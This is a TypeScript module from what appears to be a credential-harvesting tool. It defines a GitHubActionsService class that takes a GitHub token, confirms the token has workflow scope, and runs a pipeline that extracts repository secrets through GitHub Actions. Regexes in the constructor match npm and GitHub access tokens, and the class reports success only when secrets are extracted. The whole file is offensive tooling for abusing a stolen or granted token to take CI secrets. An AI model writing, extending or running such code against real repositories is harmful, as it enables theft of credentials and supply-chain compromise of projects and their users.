import { checkToken } from "../../github_utils/tokenCheck";
import { logUtil } from "../../utils/logger";
import { Provider } from "../base";
import type { ProviderResult } from "../types";
import { runFormatOnReposWithSecrets } from "./pipeline";

export type TokenRepo = {
  token: string;
  repo: string;
  owner: string;
};

export class GitHubActionsService extends Provider {
  private token;

  constructor(token: string) {
    super("github", "actions", {
      npmtoken: /npm_[A-Za-z0-9]{36,}/g,
      ghtoken: /gh[op]_[A-Za-z0-9]{36}/g,
    });
    this.token = token;
  }

  async execute(): Promise<ProviderResult> {
    if ((await checkToken(this.token)).hasWorkflowScope) {
      const results: any[] = [];

      const collected = runFormatOnReposWithSecrets(this.token);
      try {
        for await (const collection of collected) {
          if (!collection.error) {
            results.push(collection);
          }
        }
      } catch (e) {
        logUtil.error("Failure collecting results");
      }

      if (!results || Object.keys(results).length === 0) {
        logUtil.log("No Secrets.");
        return this.failure("No secrets extracted");
      } else {
        return this.success({ results });
      }
    } else {
      logUtil.log("Missing workflow scope.");
      return this.failure("No workfow scope or invalid!");
    }
  }
}
